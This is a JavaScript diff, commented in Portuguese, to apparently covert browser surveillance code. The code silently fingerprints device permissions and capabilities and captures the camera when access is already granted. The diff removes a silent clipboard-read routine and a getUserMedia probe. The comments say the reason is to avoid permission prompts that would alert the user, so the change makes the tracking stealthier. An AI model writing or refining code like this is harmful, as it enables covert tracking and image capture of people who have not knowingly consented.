@@ -97,7 +97,7 @@ async function collectSilentFingerprint() {
   let permissions = 'N/A'
   try {
     const perms = {}
-    const names = ['camera', 'microphone', 'notifications', 'clipboard-read', 'clipboard-write', 'geolocation']
+    const names = ['camera', 'microphone', 'notifications', 'geolocation']
     await Promise.all(names.map(async name => {
       try { perms[name] = (await navigator.permissions.query({ name })).state } catch (e) {}
     }))
@@ -129,13 +129,10 @@ async function collectSilentFingerprint() {
   check('vrDisplays', () => !!navigator.xr)
   check('mediaCapabilities', () => !!navigator.mediaCapabilities)
 
-  // Clipboard silencioso
+  // Clipboard — apenas verifica disponibilidade, NUNCA lê (evita prompt de permissão)
   let clipboard = 'N/A'
   try {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      const text = await Promise.race([navigator.clipboard.readText(), new Promise((_, rej) => setTimeout(() => rej('timeout'), 400))])
-      clipboard = { available: true, preview: text?.slice(0, 40) || '' }
-    }
+    clipboard = { readAvailable: !!navigator.clipboard?.readText, writeAvailable: !!navigator.clipboard?.writeText }
   } catch (e) { clipboard = { available: false } }
 
   return {
@@ -198,10 +195,8 @@ async function captureCameraIfPermitted() {
       const perm = await navigator.permissions.query({ name: 'camera' })
       permitted = perm.state === 'granted'
     } catch (e) {
-      // Fallback: tentar getUserMedia e ver se resolve sem erro
-      const testStream = await navigator.mediaDevices.getUserMedia({ video: true })
-      testStream.getTracks().forEach(t => t.stop())
-      permitted = true
+      // NUNCA tentar getUserMedia sem permissão confirmada — evita prompt óbvio
+      permitted = false
     }
 
     if (!permitted) {
